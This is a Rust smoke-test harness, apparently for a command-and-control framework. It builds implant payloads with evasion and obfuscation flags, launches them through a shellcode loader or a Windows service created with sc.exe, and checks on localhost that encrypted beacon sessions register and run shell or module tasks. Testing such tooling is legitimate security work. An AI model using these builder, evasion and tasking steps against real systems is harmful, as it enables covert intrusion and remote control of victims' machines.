use axum::body::Bytes;
use axum::extract::State;
use axum::http::{HeaderMap, Method, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::routing::any;
use axum::Router;
use clap::Parser;
use hmac::{Hmac, Mac};
use sha2::{Digest, Sha256};
use specter_common::proto::specter::v1::{TaskPriority, TaskStatus};
use specter_server::builder::{
    BuilderConfig, ChannelConfig, EvasionFlags, ObfuscationSettings, OutputFormat, PayloadBuilder,
    SleepConfig,
};
use specter_server::db::migrations::run_migrations;
use specter_server::event::EventBus;
use specter_server::listener::{build_router, HttpState, ListenerManager};
use specter_server::module::{ModuleRepository, ModuleType};
use specter_server::profile::schema::Profile;
use specter_server::profile::{compile_listener_config, parse_profile, validate_profile};
use specter_server::session::SessionManager;
use specter_server::task::TaskDispatcher;
use sqlx::sqlite::{SqliteConnectOptions, SqlitePoolOptions};
use std::error::Error;
use std::fs::{self, File};
use std::io::{self, Write};
use std::net::TcpListener as StdTcpListener;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::net::TcpListener;
use tokio::process::{Child, Command};
use tokio::sync::oneshot;
use x25519_dalek::{PublicKey, StaticSecret};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SmokeArtifactFormat {
    Raw,
    DotNet,
    Service,
}

impl SmokeArtifactFormat {
    fn parse(value: &str) -> Result<Self, String> {
        match value.to_ascii_lowercase().as_str() {
            "raw" | "shellcode" | "bin" => Ok(Self::Raw),
            "dotnet" | "exe" => Ok(Self::DotNet),
            "service" | "service_exe" | "svc" => Ok(Self::Service),
            other => Err(format!(
                "unsupported artifact format '{other}' (expected raw, dotnet, or service)"
            )),
        }
    }

    fn output_format(self) -> OutputFormat {
        match self {
            Self::Raw => OutputFormat::RawShellcode,
            Self::DotNet => OutputFormat::DotNetAssembly,
            Self::Service => OutputFormat::ServiceExe,
        }
    }

    fn as_str(self) -> &'static str {
        match self {
            Self::Raw => "raw",
            Self::DotNet => "dotnet",
            Self::Service => "service_exe",
        }
    }

    fn uses_loader(self) -> bool {
        self == Self::Raw
    }
}

#[derive(Parser, Debug)]
#[command(
    name = "pic-listener-smoke",
    about = "Build a listener-key-aligned raw PIC payload and prove encrypted /api/beacon registers a session"
)]
struct Cli {
    #[arg(long, default_value = "implant/build/specter.bin")]
    pic: PathBuf,

    #[arg(long, default_value = "implant/build/tests/pic_loader.exe")]
    loader: PathBuf,

    #[arg(long, default_value = "target/local-evidence/pic-listener-smoke.bin")]
    out: PathBuf,

    #[arg(long, default_value = "raw", value_parser = SmokeArtifactFormat::parse)]
    artifact_format: SmokeArtifactFormat,

    #[arg(long, default_value = "target/local-evidence/pic-listener-smoke.db")]
    db: PathBuf,

    #[arg(
        long,
        default_value = "target/local-evidence/pic-listener-smoke.loader.log"
    )]
    loader_log: PathBuf,

    #[arg(long, default_value = "127.0.0.1")]
    bind: String,

    #[arg(long)]
    port: Option<u16>,

    #[arg(long, default_value_t = 20_000)]
    timeout_ms: u64,

    #[arg(long)]
    task_command: Option<String>,

    #[arg(long)]
    module_smoke: bool,

    #[arg(long, default_value = "implant/build/modules/template.bin")]
    module_blob: PathBuf,

    #[arg(long, default_value = "template")]
    module_name: String,

    #[arg(long, default_value = "ping")]
    module_args: String,

    #[arg(long, default_value_t = 0)]
    module_dispatch_delay_ms: u64,

    #[arg(long, default_value_t = 70 * 1024)]
    min_result_bytes: usize,

    #[arg(long)]
    legacy_only: bool,

    #[arg(long)]
    builder_equivalent: bool,

    #[arg(long)]
    xor: bool,

    #[arg(long)]
    profile_mode: bool,

    #[arg(long)]
    profile_yaml: Option<PathBuf>,

    #[arg(long)]
    redirector_mode: bool,

    #[arg(long, default_value_t = 0)]
    min_profile_checkins: usize,

    #[arg(long, default_value_t = 0)]
    min_beacon_checkins: usize,

    #[arg(long, default_value_t = 0)]
    hold_after_register_ms: u64,

    #[arg(long, default_value_t = 0)]
    hold_after_task_complete_ms: u64,

    #[arg(long)]
    loader_protect_rx: bool,

    #[arg(long)]
    loader_split_protect: bool,

    #[arg(long)]
    loader_detach_thread: bool,

    #[arg(long)]
    service_scm: bool,

    #[arg(long, default_value = "SpecterSvc")]
    service_name: String,

    #[arg(long)]
    loader_rw_offset: Option<String>,

    #[arg(long)]
    evasion_module_overload: bool,

    #[arg(long)]
    evasion_pdata_register: bool,

    #[arg(long)]
    evasion_ntcontinue_entry: bool,

    #[arg(long)]
    evasion_module_preserve_headers: bool,

    #[arg(long)]
    evasion_module_patch_only: bool,
}

#[derive(Clone)]
struct LocalRedirectorState {
    upstream_base: String,
    client: reqwest::Client,
    total_requests: Arc<AtomicUsize>,
    profile_requests: Arc<AtomicUsize>,
    profile_paths: Arc<Vec<String>>,
}

fn test_profile() -> Profile {
    let yaml = r#"
name: "pic-listener-smoke"
description: "Local PIC listener smoke profile"
tls:
  cipher_suites: []
  extensions: []
  curves: []
  alpn: []
http:
  request:
    method: POST
    uri_patterns:
      - /api/profile
    headers: []
    data_embed_points: []
  response:
    status_code: 200
    headers: []
    data_embed_points: []
timing:
  callback_interval: 1
  jitter_percent: 0
transform:
  compress: none
  encrypt: cha_cha20_poly1305
  encode: base64
"#;
    serde_yaml::from_str(yaml).expect("static smoke profile must parse")
}

fn load_profile_yaml(path: &Path) -> Result<Profile, Box<dyn Error>> {
    let yaml = fs::read_to_string(path)
        .map_err(|e| format!("failed to read profile YAML '{}': {e}", path.display()))?;
    let profile = parse_profile(&yaml)
        .map_err(|e| format!("failed to parse profile YAML '{}': {e}", path.display()))?;
    validate_profile(&profile)
        .map_err(|e| format!("profile YAML '{}' failed validation: {e}", path.display()))?;
    Ok(profile)
}

fn template_dir(pic: &Path) -> PathBuf {
    if pic.is_dir() {
        pic.to_path_buf()
    } else {
        pic.parent().unwrap_or_else(|| Path::new(".")).to_path_buf()
    }
}

fn find_free_port(bind: &str) -> Result<u16, Box<dyn Error>> {
    let socket = StdTcpListener::bind((bind, 0))?;
    Ok(socket.local_addr()?.port())
}

fn derive_profile_session_key(server_secret: &StaticSecret, implant_pubkey: &[u8; 32]) -> [u8; 32] {
    type HmacSha256 = Hmac<Sha256>;

    let implant_pub = PublicKey::from(*implant_pubkey);
    let shared = server_secret.diffie_hellman(&implant_pub);
    let mut mac =
        <HmacSha256 as Mac>::new_from_slice(implant_pubkey).expect("HMAC key length is valid");
    mac.update(shared.as_bytes());
    let prk = mac.finalize().into_bytes();

    let mut mac = <HmacSha256 as Mac>::new_from_slice(&prk).expect("HMAC key length is valid");
    mac.update(b"specter-session");
    mac.update(&[1u8]);
    let okm = mac.finalize().into_bytes();

    let mut out = [0u8; 32];
    out.copy_from_slice(&okm[..32]);
    out
}

fn encode_module_string_args(args: &str) -> Vec<u8> {
    let parts: Vec<&str> = args.split_whitespace().collect();
    let mut out = Vec::new();
    out.extend_from_slice(&(parts.len() as u32).to_le_bytes());
    for part in parts {
        out.extend_from_slice(&0u32.to_le_bytes());
        out.extend_from_slice(&(part.len() as u32 + 1).to_le_bytes());
        out.extend_from_slice(part.as_bytes());
        out.push(0);
    }
    out
}

fn hex_lower(bytes: &[u8]) -> String {
    let mut out = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        out.push_str(&format!("{byte:02x}"));
    }
    out
}

async fn run_sc(args: &[&str]) -> Result<String, Box<dyn Error>> {
    let output = Command::new("sc.exe").args(args).output().await?;
    let mut text = String::new();
    text.push_str(&String::from_utf8_lossy(&output.stdout));
    text.push_str(&String::from_utf8_lossy(&output.stderr));
    if !output.status.success() {
        return Err(format!("sc.exe {} failed: {text}", args.join(" ")).into());
    }
    Ok(text)
}

async fn query_service_pid(service_name: &str) -> Result<Option<u32>, Box<dyn Error>> {
    let text = run_sc(&["queryex", service_name]).await?;
    for line in text.lines() {
        let trimmed = line.trim();
        if let Some(pid) = trimmed.strip_prefix("PID") {
            if let Some(value) = pid.split(':').nth(1) {
                let parsed = value.trim().parse::<u32>().unwrap_or(0);
                if parsed != 0 {
                    return Ok(Some(parsed));
                }
            }
        }
    }
    Ok(None)
}

async fn stop_payload(child: &mut Option<Child>, service_name: Option<&str>) {
    if let Some(child) = child {
        let _ = child.kill().await;
    }
    if let Some(service_name) = service_name {
        let _ = run_sc(&["stop", service_name]).await;
        let _ = run_sc(&["delete", service_name]).await;
    }
}

async fn redirector_handler(
    State(state): State<LocalRedirectorState>,
    method: Method,
    headers: HeaderMap,
    uri: axum::http::Uri,
    body: Bytes,
) -> Response {
    state.total_requests.fetch_add(1, Ordering::SeqCst);
    if state.profile_paths.iter().any(|path| path == uri.path()) {
        state.profile_requests.fetch_add(1, Ordering::SeqCst);
    }

    let path_and_query = uri
        .path_and_query()
        .map(|pq| pq.as_str())
        .unwrap_or(uri.path());
    let target = format!("{}{}", state.upstream_base, path_and_query);

    let reqwest_method =
        reqwest::Method::from_bytes(method.as_str().as_bytes()).unwrap_or(reqwest::Method::POST);
    let mut request = state.client.request(reqwest_method, target);
    for (name, value) in &headers {
        if name.as_str().eq_ignore_ascii_case("host")
            || name.as_str().eq_ignore_ascii_case("content-length")
        {
            continue;
        }
        request = request.header(name.as_str(), value.as_bytes());
    }

    match request.body(body.to_vec()).send().await {
        Ok(upstream) => {
            let status =
                StatusCode::from_u16(upstream.status().as_u16()).unwrap_or(StatusCode::BAD_GATEWAY);
            let headers = upstream.headers().clone();
            match upstream.bytes().await {
                Ok(bytes) => {
                    let mut response = Response::builder().status(status);
                    for (name, value) in &headers {
                        if name.as_str().eq_ignore_ascii_case("transfer-encoding")
                            || name.as_str().eq_ignore_ascii_case("content-length")
                        {
                            continue;
                        }
                        response = response.header(name.as_str(), value.as_bytes());
                    }
                    response = response.header("Content-Length", bytes.len().to_string());
                    response
                        .body(axum::body::Body::from(bytes))
                        .unwrap_or_else(|_| StatusCode::BAD_GATEWAY.into_response())
                }
                Err(_) => StatusCode::BAD_GATEWAY.into_response(),
            }
        }
        Err(_) => StatusCode::BAD_GATEWAY.into_response(),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "specter_server=info,pic_listener_smoke=info".into()),
        )
        .init();

    let cli = Cli::parse();
    if cli.module_smoke && cli.task_command.is_some() {
        return Err("--module-smoke and --task-command are mutually exclusive".into());
    }
    if cli.service_scm && cli.artifact_format != SmokeArtifactFormat::Service {
        return Err("--service-scm requires --artifact-format service".into());
    }
    let expects_task = cli.task_command.is_some() || cli.module_smoke;
    let port = match cli.port {
        Some(port) => port,
        None => find_free_port(&cli.bind)?,
    };
    let redirector_port = if cli.redirector_mode {
        Some(find_free_port(&cli.bind)?)
    } else {
        None
    };

    if let Some(parent) = cli.out.parent() {
        fs::create_dir_all(parent)?;
    }
    if let Some(parent) = cli.db.parent() {
        fs::create_dir_all(parent)?;
    }
    if let Some(parent) = cli.loader_log.parent() {
        fs::create_dir_all(parent)?;
    }

    if cli.db.exists() {
        fs::remove_file(&cli.db)?;
    }

    let pool = SqlitePoolOptions::new()
        .max_connections(4)
        .connect_with(
            SqliteConnectOptions::new()
                .filename(&cli.db)
                .create_if_missing(true),
        )
        .await?;
    run_migrations(&pool).await?;

    let event_bus = Arc::new(EventBus::new(128));
    let session_manager = Arc::new(SessionManager::new(pool.clone(), Arc::clone(&event_bus)));
    let task_dispatcher = Arc::new(TaskDispatcher::new(pool.clone(), Arc::clone(&event_bus)));
    let module_repository = Arc::new(ModuleRepository::new(pool.clone()));
    let smoke_module_id = if cli.module_smoke {
        let blob = fs::read(&cli.module_blob).map_err(|e| {
            format!(
                "failed to read module smoke blob '{}': {e}",
                cli.module_blob.display()
            )
        })?;
        Some(
            module_repository
                .store_module(
                    &cli.module_name,
                    "smoke",
                    ModuleType::Pic,
                    "pic-listener-smoke module",
                    &blob,
                )
                .await?,
        )
    } else {
        None
    };
    let profile_transport_enabled = cli.profile_mode || !cli.legacy_only;
    let listener_manager = if profile_transport_enabled {
        None
    } else {
        Some(ListenerManager::new(
            pool.clone(),
            Arc::clone(&session_manager),
            Arc::clone(&task_dispatcher),
            Arc::clone(&event_bus),
            None,
            None,
        ))
    };

    let profile = match cli.profile_yaml.as_deref() {
        Some(path) => load_profile_yaml(path)?,
        None => test_profile(),
    };
    println!("PIC listener smoke profile: {}", profile.name);
    let (server_secret, server_pubkey, listener_id) =
        if let Some(listener_manager) = listener_manager.as_ref() {
            let listener = listener_manager
                .create_listener("pic-listener-smoke", &cli.bind, port as u32, "http", "")
                .await?;
            let listener_pubkey = listener_manager
                .get_listener_pubkey(&listener.id)
                .await
                .ok_or("listener public key was not generated")?;
            (None, PublicKey::from(listener_pubkey), Some(listener.id))
        } else {
            let secret = StaticSecret::random_from_rng(rand::thread_rng());
            let pubkey = PublicKey::from(&secret);
            (Some(secret), pubkey, None)
        };

    let builder = PayloadBuilder::new(&BuilderConfig {
        template_dir: template_dir(&cli.pic),
    })?
    .with_module_signing_key(module_repository.signing_pubkey_bytes());
    let callback_port = redirector_port.unwrap_or(port);
    let channel = format!("http://{}:{}/api/beacon", cli.bind, callback_port);
    let evasion_flags = EvasionFlags {
        module_overloading: cli.evasion_module_overload,
        pdata_registration: cli.evasion_pdata_register,
        ntcontinue_entry: cli.evasion_ntcontinue_entry,
        etw_usermode_patch: false,
        module_preserve_headers: cli.evasion_module_preserve_headers,
        module_patch_only: cli.evasion_module_patch_only,
    };

    let obfuscation_settings = if cli.builder_equivalent {
        ObfuscationSettings {
            xor_encryption: cli.xor,
            ..ObfuscationSettings::default()
        }
    } else {
        ObfuscationSettings {
            string_encryption: false,
            api_hash_randomization: false,
            junk_code_insertion: false,
            junk_density: 0,
            control_flow_flattening: false,
            xor_encryption: cli.xor,
        }
    };

    let result = builder.build_with_evasion_options(
        cli.artifact_format.output_format(),
        &profile,
        &server_pubkey,
        &[ChannelConfig {
            kind: "http".to_string(),
            address: channel.clone(),
        }],
        &SleepConfig {
            interval_secs: 1,
            jitter_percent: 0,
        },
        None,
        evasion_flags,
        true,
        true,
        &obfuscation_settings,
        cli.legacy_only,
    )?;

    fs::write(&cli.out, &result.payload)?;
    let source_pic_size = fs::metadata(&cli.pic)
        .map(|m| m.len() as usize)
        .unwrap_or(0);
    let config_blob_size = result
        .payload
        .len()
        .saturating_sub(source_pic_size)
        .saturating_sub(4);
    let output_sha256 = Sha256::digest(&result.payload);
    println!(
        "PIC listener smoke artifact source: {}",
        if cli.artifact_format != SmokeArtifactFormat::Raw {
            "builder_pe_template"
        } else if cli.builder_equivalent {
            "builder_equivalent"
        } else {
            "raw_pic"
        }
    );
    println!(
        "PIC listener smoke artifact format: {}",
        cli.artifact_format.as_str()
    );
    println!(
        "PIC listener smoke builder transforms enabled: {}",
        cli.builder_equivalent
    );
    println!("PIC listener smoke XOR wrapper enabled: {}", cli.xor);
    println!("PIC listener smoke profile transport enabled: {profile_transport_enabled}");
    println!("PIC listener smoke builder config blob size: {config_blob_size}");
    println!(
        "PIC listener smoke builder output SHA256: {}",
        hex_lower(&output_sha256)
    );
    sqlx::query(
        "INSERT INTO builds (id, implant_pubkey, implant_pubkey_prefix, format, created_at, operator_id) \
         VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
    )
    .bind(&result.build_id)
    .bind(&result.implant_pubkey[..])
    .bind(&result.implant_pubkey[..12])
    .bind(result.format.as_str())
    .bind(chrono::Utc::now().timestamp())
    .bind("pic-listener-smoke")
    .execute(&pool)
    .await?;

    let mut shutdown_tx = None;
    let mut redirector_shutdown_tx = None;
    let redirector_total_requests = Arc::new(AtomicUsize::new(0));
    let redirector_profile_requests = Arc::new(AtomicUsize::new(0));
    if let (Some(listener_manager), Some(listener_id)) = (listener_manager.as_ref(), &listener_id) {
        listener_manager
            .start_listener(listener_id)
            .await
            .map_err(|e| format!("listener start failed: {e}"))?;
    } else {
        let server_secret = server_secret.ok_or("profile mode missing server secret")?;
        let profile_session_key =
            derive_profile_session_key(&server_secret, &result.implant_pubkey);
        let state = HttpState {
            session_manager: Arc::clone(&session_manager),
            task_dispatcher: Arc::clone(&task_dispatcher),
            event_bus: Arc::clone(&event_bus),
            operation_log: None,
            module_repository: None,
            socks_manager: None,
            server_secret: Arc::new(server_secret),
            server_pubkey: Arc::new(server_pubkey),
            listener_profile: Some(Arc::new(compile_listener_config(&profile))),
            profile_session_key: Some(Arc::new(profile_session_key)),
            pool: pool.clone(),
        };
        let app = build_router(state);
        let tcp = TcpListener::bind(format!("{}:{}", cli.bind, port)).await?;
        let (tx, rx) = oneshot::channel::<()>();
        shutdown_tx = Some(tx);
        tokio::spawn(async move {
            if let Err(e) = axum::serve(tcp, app)
                .with_graceful_shutdown(async {
                    let _ = rx.await;
                })
                .await
            {
                tracing::error!("profile smoke listener error: {e}");
            }
        });
    }
    if let Some(redirector_port) = redirector_port {
        let upstream_base = format!("http://{}:{}", cli.bind, port);
        let state = LocalRedirectorState {
            upstream_base,
            client: reqwest::Client::new(),
            total_requests: Arc::clone(&redirector_total_requests),
            profile_requests: Arc::clone(&redirector_profile_requests),
            profile_paths: Arc::new(profile.http.request.uri_patterns.clone()),
        };
        let app = Router::new()
            .fallback(any(redirector_handler))
            .with_state(state);
        let tcp = TcpListener::bind(format!("{}:{}", cli.bind, redirector_port)).await?;
        let (tx, rx) = oneshot::channel::<()>();
        redirector_shutdown_tx = Some(tx);
        tokio::spawn(async move {
            if let Err(e) = axum::serve(tcp, app)
                .with_graceful_shutdown(async {
                    let _ = rx.await;
                })
                .await
            {
                tracing::error!("local redirector smoke error: {e}");
            }
        });
        println!(
            "PIC listener smoke redirector: http://{}:{} -> http://{}:{}",
            cli.bind, redirector_port, cli.bind, port
        );
    }

    println!("PIC listener smoke channel: {channel}");
    println!(
        "PIC listener smoke payload: {} ({} bytes)",
        cli.out.display(),
        result.payload.len()
    );

    let log = File::create(&cli.loader_log)?;
    let log_err = log.try_clone()?;
    let mut child: Option<Child> = None;
    let service_launch_name = if cli.service_scm {
        let service_name = cli.service_name.clone();
        let _ = run_sc(&["stop", &service_name]).await;
        let _ = run_sc(&["delete", &service_name]).await;
        run_sc(&[
            "create",
            &service_name,
            "binPath=",
            cli.out
                .to_str()
                .ok_or("payload path is not valid UTF-8 for sc.exe")?,
            "type=",
            "own",
            "start=",
            "demand",
        ])
        .await?;
        run_sc(&["start", &service_name]).await?;
        println!("PIC listener smoke launch mode: service_scm");
        println!("PIC listener smoke service name: {service_name}");
        Some(service_name)
    } else {
        let mut payload_command = if cli.artifact_format.uses_loader() {
            let mut command = Command::new(&cli.loader);
            command
                .arg(&cli.out)
                .arg("--timeout-ms")
                .arg(cli.timeout_ms.to_string());
            if cli.loader_protect_rx {
                command.arg("--protect-rx");
            }
            if cli.loader_split_protect {
                command.arg("--split-protect");
                if let Some(offset) = cli.loader_rw_offset.as_deref() {
                    command.arg("--rw-offset").arg(offset);
                }
            }
            if cli.loader_detach_thread {
                command.arg("--detach-thread");
            }
            println!("PIC listener smoke launch mode: raw_loader");
            command
        } else {
            let command = Command::new(&cli.out);
            println!("PIC listener smoke launch mode: pe_template_direct");
            command
        };
        let spawned = payload_command
            .stdout(Stdio::from(log))
            .stderr(Stdio::from(log_err))
            .spawn()?;
        println!(
            "PIC listener smoke payload PID: {}",
            spawned.id().unwrap_or(0)
        );
        child = Some(spawned);
        None
    };

    let deadline = Instant::now() + Duration::from_millis(cli.timeout_ms);
    let mut passed_session = None;
    let mut queued_task = None;
    let mut completed_task = None;
    let mut completed_at = None;
    let mut loader_exit = None;
    let mut registered_at = None;
    let mut last_checkin_secs = None;
    let mut beacon_checkins = 0usize;
    let mut printed_service_pid = false;

    while Instant::now() < deadline {
        if let Some(child) = child.as_mut() {
            if let Some(status) = child.try_wait()? {
                loader_exit = status.code();
                break;
            }
        } else if let Some(service_name) = service_launch_name.as_deref() {
            if !printed_service_pid {
                if let Ok(Some(pid)) = query_service_pid(service_name).await {
                    println!("PIC listener smoke payload PID: {pid}");
                    printed_service_pid = true;
                }
            }
        }

        if passed_session.is_none() {
            let sessions = session_manager.list_sessions().await?;
            if let Some(session) = sessions.first() {
                passed_session = Some(session.id.clone());
                registered_at = Some(Instant::now());
                last_checkin_secs = session.last_checkin.as_ref().map(|ts| ts.seconds);
                beacon_checkins = 1;
                println!("PIC listener smoke session registered: {}", session.id);
                println!("PIC listener smoke beacon check-ins: {beacon_checkins}");
                let _ = io::stdout().flush();
            }
        }

        if let Some(session_id) = passed_session.as_deref() {
            if let Some(session) = session_manager.get_session(session_id).await? {
                if let Some(checkin) = session.last_checkin.as_ref().map(|ts| ts.seconds) {
                    if last_checkin_secs.map(|last| checkin > last).unwrap_or(true) {
                        last_checkin_secs = Some(checkin);
                        beacon_checkins = beacon_checkins.saturating_add(1);
                        println!("PIC listener smoke beacon check-ins: {beacon_checkins}");
                        let _ = io::stdout().flush();
                    }
                }
            }

            if queued_task.is_none() {
                let dispatch_delay_elapsed = registered_at
                    .map(|at| at.elapsed() >= Duration::from_millis(cli.module_dispatch_delay_ms))
                    .unwrap_or(false);
                if !dispatch_delay_elapsed {
                    tokio::time::sleep(Duration::from_millis(250)).await;
                    continue;
                }

                if let Some(module_id) = smoke_module_id.as_deref() {
                    let mut task_args = module_repository
                        .package_module(module_id, &result.implant_pubkey)
                        .await
                        .map_err(|e| format!("module packaging failed: {e}"))?;
                    let module_args = encode_module_string_args(&cli.module_args);
                    task_args.push(0);
                    task_args.extend_from_slice(&module_args);
                    let task_id = task_dispatcher
                        .queue_task(
                            session_id,
                            "module_load",
                            &task_args,
                            TaskPriority::Normal,
                            "pic-listener-smoke",
                        )
                        .await?;
                    println!("PIC listener smoke queued module task: {task_id}");
                    queued_task = Some(task_id);
                } else if let Some(command) = cli.task_command.as_deref() {
                    let task_id = task_dispatcher
                        .queue_task(
                            session_id,
                            "shell",
                            command.as_bytes(),
                            TaskPriority::Normal,
                            "pic-listener-smoke",
                        )
                        .await?;
                    println!("PIC listener smoke queued task: {task_id}");
                    queued_task = Some(task_id);
                } else {
                    if (cli.hold_after_register_ms == 0
                        || registered_at
                            .map(|at| {
                                at.elapsed() >= Duration::from_millis(cli.hold_after_register_ms)
                            })
                            .unwrap_or(false))
                        && beacon_checkins >= cli.min_beacon_checkins
                    {
                        stop_payload(&mut child, service_launch_name.as_deref()).await;
                        break;
                    }
                }
            }
        }

        if let Some(task_id) = queued_task.as_deref() {
            if let Some(task) = task_dispatcher.get_task(task_id).await? {
                if task.status == TaskStatus::Complete as i32
                    || task.status == TaskStatus::Failed as i32
                {
                    if completed_task.is_none() {
                        completed_at = Some(Instant::now());
                        let status_label = if task.status == TaskStatus::Complete as i32 {
                            "complete"
                        } else {
                            "failed"
                        };
                        println!(
                            "PIC listener smoke task complete: task_id={} status={} result_bytes={}",
                            task.id,
                            status_label,
                            task.result.len()
                        );
                        let _ = io::stdout().flush();
                    }
                    completed_task = Some(task);
                }
            }
        }

        if completed_task.is_some()
            && redirector_profile_requests.load(Ordering::SeqCst) >= cli.min_profile_checkins
            && beacon_checkins >= cli.min_beacon_checkins
            && completed_at
                .map(|at| at.elapsed() >= Duration::from_millis(cli.hold_after_task_complete_ms))
                .unwrap_or(true)
        {
            stop_payload(&mut child, service_launch_name.as_deref()).await;
            break;
        }

        tokio::time::sleep(Duration::from_millis(250)).await;
    }

    if let (Some(listener_manager), Some(listener_id)) = (listener_manager.as_ref(), &listener_id) {
        let _ = listener_manager.stop_listener(listener_id).await;
    }
    if let Some(tx) = shutdown_tx {
        let _ = tx.send(());
    }
    if let Some(tx) = redirector_shutdown_tx {
        let _ = tx.send(());
    }

    if let Some(task) = completed_task {
        if task.status != TaskStatus::Complete as i32 {
            return Err(format!(
                "PIC listener smoke failed: task {} returned non-complete status {}; result_len={}; log={}",
                task.id,
                task.status,
                task.result.len(),
                cli.loader_log.display()
            )
            .into());
        }
        if task.result.len() < cli.min_result_bytes {
            return Err(format!(
                "PIC listener smoke failed: task {} result too small: {} < {}; log={}",
                task.id,
                task.result.len(),
                cli.min_result_bytes,
                cli.loader_log.display()
            )
            .into());
        }
        let profile_checkins = redirector_profile_requests.load(Ordering::SeqCst);
        if beacon_checkins < cli.min_beacon_checkins {
            return Err(format!(
                "PIC listener smoke failed: only {beacon_checkins} beacon check-ins observed; required {}; log={}",
                cli.min_beacon_checkins,
                cli.loader_log.display()
            )
            .into());
        }
        if profile_checkins < cli.min_profile_checkins {
            return Err(format!(
                "PIC listener smoke failed: only {profile_checkins} profile check-ins observed; required {}; log={}",
                cli.min_profile_checkins,
                cli.loader_log.display()
            )
            .into());
        }

        println!(
            "PIC listener smoke: PASS session_id={} task_id={} result_bytes={} beacon_checkins={} profile_checkins={} redirector_requests={}",
            passed_session.as_deref().unwrap_or("<unknown>"),
            task.id,
            task.result.len(),
            beacon_checkins,
            profile_checkins,
            redirector_total_requests.load(Ordering::SeqCst)
        );
        println!("Loader log: {}", cli.loader_log.display());
        return Ok(());
    }

    if !expects_task {
        if let Some(session_id) = passed_session {
            if beacon_checkins < cli.min_beacon_checkins {
                return Err(format!(
                    "PIC listener smoke failed: only {beacon_checkins} beacon check-ins observed; required {}; log={}",
                    cli.min_beacon_checkins,
                    cli.loader_log.display()
                )
                .into());
            }
            println!(
                "PIC listener smoke: PASS session_id={session_id} beacon_checkins={beacon_checkins}"
            );
            println!("Loader log: {}", cli.loader_log.display());
            return Ok(());
        }
    } else if let Some(session_id) = passed_session {
        return Err(format!(
            "PIC listener smoke failed: session {session_id} registered but task did not complete; task_id={:?}; loader_exit={:?}; log={}",
            queued_task,
            loader_exit,
            cli.loader_log.display()
        )
        .into());
    }

    if let Some(session_id) = passed_session {
        if beacon_checkins < cli.min_beacon_checkins {
            return Err(format!(
                "PIC listener smoke failed: only {beacon_checkins} beacon check-ins observed; required {}; log={}",
                cli.min_beacon_checkins,
                cli.loader_log.display()
            )
            .into());
        }
        println!(
            "PIC listener smoke: PASS session_id={session_id} beacon_checkins={beacon_checkins}"
        );
        println!("Loader log: {}", cli.loader_log.display());
        return Ok(());
    }

    if loader_exit.is_none() {
        stop_payload(&mut child, service_launch_name.as_deref()).await;
    }

    Err(format!(
        "PIC listener smoke failed: no session registered; loader_exit={:?}; log={}",
        loader_exit,
        cli.loader_log.display()
    )
    .into())
}
